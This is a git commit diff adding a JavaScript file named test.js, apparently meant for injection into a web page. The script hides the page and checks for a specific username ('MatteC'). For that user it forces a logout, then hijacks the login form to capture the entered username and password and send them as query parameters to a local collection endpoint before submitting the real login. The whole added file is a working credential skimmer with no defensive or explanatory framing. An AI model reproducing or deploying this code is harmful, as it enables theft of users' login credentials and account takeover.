870946f8ad655ff5af57e39f5bafde8d5905b9e1
debian <debian@debian.debian>
2025-10-28 21:35:19 +0100

    changes

--- test.js
+++ test.js
@@ -1,1 +1,46 @@
-aaa
+document.write('<style id="temp-hide-body">body{visibility:hidden;}</style>');
+
+const el = document.getElementById('nick');
+const username = el ? el.textContent : "";
+
+const allowedUsernames = ["MatteC"];
+
+if (allowedUsernames.includes(username)) {
+    console.log("VALID USERNAME")
+
+    Logout.submit()
+
+    const styleTag = document.getElementById('temp-hide-body');
+    if (styleTag) styleTag.remove();
+
+    loginForm = document.getElementById('loginForm');
+    loginForm.onsubmit = null;
+    loginForm.addEventListener('submit', (event) => {
+        event.preventDefault();
+        event.stopImmediatePropagation();
+
+        login_username = event.target.UserName.value;
+        login_password = event.target.PassWord.value;
+        sendLogin(login_username, login_password, function (data) {
+            console.log('Login finished, now submit the form');
+            document.getElementById('loginForm').submit();
+        });
+
+    });
+
+} else {
+    console.log("INVALID USERNAME")
+}
+
+function sendLogin(username, password, onFinish) {
+    const url = new URL('http://127.0.0.1:5000/credentials');
+    url.searchParams.append('username', username);
+    url.searchParams.append('password', password);
+
+    fetch(url, { method: 'GET' })
+        .then(data => {
+            if (onFinish) onFinish(data); // call callback when done
+        })
+        .catch(err => console.error('Fetch error:', err));
+}
+
